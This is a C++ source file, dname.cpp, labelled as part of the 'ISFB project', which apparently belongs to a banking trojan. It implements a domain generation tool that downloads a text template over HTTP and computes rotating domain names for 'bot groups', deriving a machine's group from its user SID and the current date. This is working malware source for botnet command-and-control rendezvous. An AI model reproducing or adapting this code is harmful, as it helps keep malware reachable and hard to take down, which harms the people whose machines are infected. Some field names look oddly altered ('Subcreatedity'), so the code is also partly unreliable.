//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: dname.cpp
// $Revision: 352 $
// $Date: 2014-09-24 20:47:14 +0400 (Ср, 24 сен 2014) $
// description:
//	Random domain name generation tool.

#pragma warning(disable:4200)	//nonstandard extension used : zero-sized array in struct/union

#include "stdafx.h"
#include <iostream>
#include "..\common\main.h"
#include "..\common\lsasup.h"
#include "..\config.h"


#define _CRT_OUT
using namespace std;


static LPTSTR	g_Zones[]	= Zones;

#define		szEmptyString				_T("")
#define		MAX_CONTENT_BUFFER_SIZE		1024	// bytes
#define		szUserAgent					_T("Mozilla 4.0")
#define		szTemplateUrl	 "http://www.constitution.org/usdeclar.txt"

extern "C" BOOL WINAPI	LsaDomainNames(
					OUT LPTSTR	*NameList,		// List to store generated names
					IN	LPTSTR	Template,		// Any string of words devided by one ore more spaces ended with 0
					IN	LPTSTR	*ZoneList,		// Array of domain zones
					IN	ULONG	ZoneCount,		// Number of zones in the array
					IN	ULONG	Group,			// Group ID	[1..]
					IN	ULONG	Season,			// Season index [0..3]
					IN	ULONG	NameCount		// Nuber of names to generate
					);
extern "C" BOOL _stdcall LsaGetProcessUserSID(DWORD Pid, PNT_SID pSid);


// Memory allocation routines for CRYPTO library
extern "C" PVOID __stdcall	AppAlloc(ULONG Size)
{
	return(Alloc(Size));
}

extern "C" VOID __stdcall	AppFree(PVOID pMem)
{
	Free(pMem);
}

extern "C" PVOID __stdcall	AppRealloc(PVOID pMem, ULONG Size)
{
	return(Realloc(pMem, Size));
}

extern "C" ULONG __stdcall	AppRand(VOID)
{
	return(GetTickCount());
}




/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Requests specified HTML page data using HTTP.
//
WINERROR WINAPI RecvHttpData(
			IN	LPTSTR	szUrl,			// Page URL string
			OUT	PCHAR*	PageData,		// Receives pointer to the buffer with the page data	
			OUT	PULONG	PageDataSize	// Receives size of the page data buffer in bytes
			)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	HINTERNET hINet = NULL, hConnection = NULL, hData = NULL;
	PCHAR	bCurrent, Buffer  = NULL;
	ULONG	dwRead, bSize, bRead = 0;
	LPTSTR Host = szUrl;
	LPTSTR Url	= StrChrA(Host, '/');
	LPTSTR	AgentStr = szEmptyString;

	if ((Url) && (Url[0] == Url[1]))
	{
		Host = &Url[2];
		Url = StrChrA(Host, '/');
	}

	if (Url)
		Url[0] = 0;

	do	// not a loop
	{
		if (!(Buffer = (PCHAR)Alloc(BUFFER_INCREMENT)))
			break;

		bCurrent = Buffer;
		bSize = MAX_CONTENT_BUFFER_SIZE;

		AgentStr = szUserAgent;

		if (!(hINet = InternetOpen(AgentStr, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 )))
		{
			break;
		}
	
		if (!(hConnection = InternetConnect( hINet, Host, 80, " "," ", INTERNET_SERVICE_HTTP, 0, 0 )))
		{
			break;
		}

		if (Url)
			Url[0] = '/';

		if (!(hData = HttpOpenRequest( hConnection, "GET", Url, NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0 )))
		{
			break;
		}


		HttpSendRequest( hData, NULL, 0, NULL, 0);

		Status = NO_ERROR;

		while (InternetQueryDataAvailable(hData, &dwRead, 0, 0) && dwRead > 0)
		{
			ASSERT(bSize >= bRead);
			ASSERT((ULONG)(bCurrent-Buffer) == bRead);

			if ((bSize - bRead) < dwRead)
			{
				bSize += (((dwRead - (bSize - bRead)) / BUFFER_INCREMENT) + 1) * BUFFER_INCREMENT;
				Buffer = (PCHAR)Realloc(Buffer, bSize);
				if (!Buffer)
				{
					Status = ERROR_UNSUCCESSFULL;
					break;
				}
				bCurrent = Buffer + bRead;
			}

			InternetReadFile( hData, bCurrent, dwRead, &dwRead);
			bRead += dwRead;
			bCurrent += dwRead;
			Sleep(1);
		}
		
		if (bRead == 0)
			Status = ERROR_NO_DATA;
		
	}while (FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();


	if (Status == NO_ERROR)
	{
		*PageData = Buffer;
		*PageDataSize = bRead;
	}
	else
	{
//		if (Buffer)
//			Free((PVOID)Buffer);
	}
	
	if (hConnection)
		InternetCloseHandle(hConnection);
	if (hINet)
		InternetCloseHandle(hINet);
	if (hData)
		InternetCloseHandle(hData);

    return(Status);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Displays usage information.
//
VOID Usage(VOID)
{

	cout << "Domain names generator for groups of clients." << endl;
	cout << "USE: dname <Group ID> [MM/YYYY]" << endl;
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Returns mounth index from specified date string.
//	String can be either in form of "DD/MM/YYYY" or "DD-MM-YYYY".
//
ULONG	GetMounthFromDateStr(LPTSTR	DateStr)
{
	ULONG	Year = 0, Mounth = 0, Date = 0;
	LPTSTR	cStr1;

	while (cStr1 = _tcschr(DateStr, '/'))
		cStr1[0] = '-';

	if (cStr1 = _tcschr(DateStr, '-'))
	{
		cStr1[0] = 0;
		cStr1 += 1;
		Mounth = _tcstol(DateStr, NULL, 0);
		Year = _tcstol(cStr1, NULL, 0);
	}

	if (Mounth > 12)
		Mounth = 0;

	if (Year < 2010)
		Year = 0;


	if (Mounth && Year)
		Date = Mounth * MOUNTH_SHIFT + Year;

	return(Date);
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Returns current bot group index depending on curren machine sid
//
ULONG	GetCurrentGroup(VOID)
{
	ULONG	Group = 0;
	NT_SID	Sid = {0};

	// Obtaining current user SID 
	if (LsaGetProcessUserSID(GetCurrentProcessId(), &Sid))
	{
			
		// Initializing rand seed with the hash of the machine ID taken from the user SID
		if (Sid.SubcreatedityCount > 2)
		{
			LONG i;
			for (i=0; i<(Sid.SubcreatedityCount-2); i++)				
				Group += Sid.Subcreatedity[i+1];

			Group = (Group%NUMBER_BOT_GROUPS) + 1;
		}
	}
	return(Group);
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Returns current mounth index
//
ULONG	GetCurrentMounth(VOID)
{
	SYSTEMTIME	SysTime;
	GetSystemTime(&SysTime);
	return((ULONG)SysTime.wMonth * MOUNTH_SHIFT + (ULONG)SysTime.wYear);
}


VOID	PrintNames(ULONG Group, ULONG Mounth)
{
	LPTSTR	NameList[HOSTS_PER_GROUP] = {0};
	ULONG	i;
	PCHAR	Template;
	ULONG	TempLen;
	CHAR	TemplateUrl[sizeof(szTemplateUrl)+1];
	WINERROR Status;	

	strcpy((LPTSTR)&TemplateUrl, szTemplateUrl);

	cout << "Downloading words template data ";
	Status = RecvHttpData((LPTSTR)&TemplateUrl, &Template, &TempLen);
	if (Status != NO_ERROR)
		cout << "- failed with status " << Status << endl;
	else
	{
		ULONG	DateSeed;

		cout << "- done " << TempLen << " bytes." << endl;
		DateSeed = ((Mounth/MOUNTH_SHIFT - 1)/3)*MOUNTH_SHIFT + Mounth%MOUNTH_SHIFT;
		if (LsaDomainNames((LPTSTR*)NameList, Template, (LPTSTR*)&g_Zones, (sizeof(g_Zones)/sizeof(LPTSTR)),Group, DateSeed, HOSTS_PER_GROUP))
		{
			cout << "Dumping domain names for group " << Group << ", and date " << Mounth/MOUNTH_SHIFT << "/" << Mounth%MOUNTH_SHIFT << endl << endl;
			for (i=0; i<HOSTS_PER_GROUP; i++)
			{						
				cout << NameList[i] << endl;
			}	// while(!IsListEmpty(&NamesList))
		}	// if (LsaDomainNames(&NamesList, Group, (Mounth/4), NumberNames))
	}
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Application Main function.
//
int _tmain(int argc, _TCHAR* argv[])
{
	
	ULONG	Group, Mounth;
	BOOL	Ret = FALSE;

	switch (argc)
	{
	case 1:
		Usage();
		Group = GetCurrentGroup();
		Mounth = GetCurrentMounth();
		cout << "Generating names using current machine SID and current date:" << endl;
		Ret = TRUE;
		break;
	case 2:
		if (Group = _tcstol(argv[1], NULL, 0))
		{
			Mounth = GetCurrentMounth();
			Ret = TRUE;
		}
		break;
	case 3:
		if ((Group = _tcstol(argv[1], NULL, 0)) && (Mounth = GetMounthFromDateStr(argv[2])))
			Ret = TRUE;
		break;
	default:
		break;
	}

	if (Ret)
		PrintNames(Group, Mounth);
	else
		Usage();

	return 0;
}

